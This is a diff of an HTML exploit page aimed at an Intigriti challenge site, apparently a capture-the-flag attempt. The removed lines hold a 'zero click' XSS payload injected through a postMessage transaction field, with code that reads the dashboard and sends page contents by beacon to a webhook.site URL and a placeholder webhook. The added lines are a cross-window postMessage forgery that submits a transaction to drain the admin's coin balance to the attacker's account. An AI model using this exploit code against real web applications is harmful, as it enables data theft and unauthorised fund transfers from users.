@@ -1,48 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Zero Click Exploit</title>
-</head>
 <body>
-    <script>
-        window.name = `
-            fetch('/dashboard.html').then(r=>r.text()).then(d => {
-                navigator.sendBeacon('https://YOUR_WEBHOOK_URL?dashboard_content=' + encodeURIComponent(d));
-            });
-            navigator.sendBeacon('https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?market_content=' + encodeURIComponent(document.body.innerHTML));
-        `;
-    </script>
+<script>
+// CONFIGURE THESE VALUES
+const TARGET = 'https://challenge-0126.intigriti.io';
+const YOUR_USERNAME = '1f4eb50b5dd8445bd28502edceac448763'; // <--- CHANGE TO YOUR USERNAME
+const AMOUNT_TO_STEAL = 100; // Admin's full 1337COIN balance
 
-    <iframe id="frame" src="https://challenge-0126.intigriti.io/checkout.html" style="width:0;height:0;border:0"></iframe>
+// Open checkout page
+const win = window.open(TARGET + '/checkout.html?currency=BTC&price=1', '_blank');
 
-    <script>
-        const TARGET = "https://challenge-0126.intigriti.io";
-        const frame = document.getElementById('frame');
-
-        // Tiny payload that fits in 'toAddress' and executes window.name
-        const short_xss = `"><svg/onload=eval(name)>`; 
-
-        frame.onload = () => {
-            // 1. Wait a moment for the iframe to be ready
-            setTimeout(() => {
-                // 2. CSRF: Trigger the transaction via postMessage
-                // No click required!
-                frame.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: short_xss, 
-                        currency: '1337COIN', // Assuming this is the trigger
-                        amount: 1000 
-                    }
-                }, '*');
-
-                // 3. Wait for transaction to process, then redirect the iframe
-                // We redirect the IFRAME, not the top window, so window.name persists
-                setTimeout(() => {
-                    frame.contentWindow.location = TARGET + '/marketwatch.html';
-                }, 2000);
-            }, 1000);
-        };
-    </script>
+setTimeout(() => {
+    // Craft transaction to steal admin's 1337COIN to your account
+    win.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            currency: '1337COIN',  // Target the rare currency
+            amount: AMOUNT_TO_STEAL,  // Drain their wallet
+            toAddress: YOUR_USERNAME  // Send to YOUR account
+        }
+    }, '*');
+    
+    setTimeout(() => {
+        win.close();
+        // Redirect to dashboard to see your new balance
+        window.location = TARGET + '/dashboard.html';
+    }, 2000);
+}, 2000);
+</script>
+<p>Processing transaction...</p>
 </body>
 </html>
